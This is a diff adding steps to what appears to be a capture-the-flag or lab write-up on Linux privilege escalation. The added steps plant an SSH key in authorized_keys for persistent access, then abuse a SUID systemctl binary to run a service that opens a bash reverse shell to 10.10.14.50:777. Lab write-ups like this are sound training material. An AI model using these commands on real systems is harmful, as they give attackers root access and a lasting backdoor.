@@ -391,7 +391,29 @@ find / -perm -4000 2>/dev/null
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 ```
 
+#### I created my ssh key and put it in authorized_keys if you don't know:
+#### Creating the key: ``ssh-keygen -P "" -f``
+#### Inside the target machine's .ssh folder you will put your public key inside the authorized_keys file
+#### ``echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDzDnPGsGNdRWfXR/PXh21mgGlToBQcV7uOjIdv+zqlrCv8WOgygVGuXC2ijqyjYiKSyFCZMxnFtST8BIDilbN9elWDYivfu1KjA1WXd1ahzlZcWkgony6XJAIQlaEhwuOwt2XjA+Ex5/YVtP8Xaf+TljxUaF5oXjyLeTTBQZEQfcd2PbSvJF8izy5FtiFB8HlGhE23IHysSEcvjv+IGzEhzCkgXLCOasb0zfhmxuwen+9/NpucYf48ywRRzo3tTIsybnA/Wi4j8IIIMjPJBjjVsYbiw+MimMgloXzVCP+z6PfX/6bN6wU7oK5vvW6IFrnDxouAMZEIUKQTicwCzZYz root@parrot" >> authorized_keys``
 
+#### Let's explore systemctl to get root, Doing a quick search we found the GTFObins page with the exploit method for systemctl
+
+> https://gtfobins.github.io/gtfobins/systemctl/
+
+#### In "ExecStart" I put my shell and executed line by line
+``ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.10.14.50/777 0>&1"``
+
+```
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.10.14.50/777 0>&1"
+[Install]
+WantedBy=multi-user.target' > $TF
+systemctl link $TF
+systemctl enable --now $TF
+
+```
 
 
 
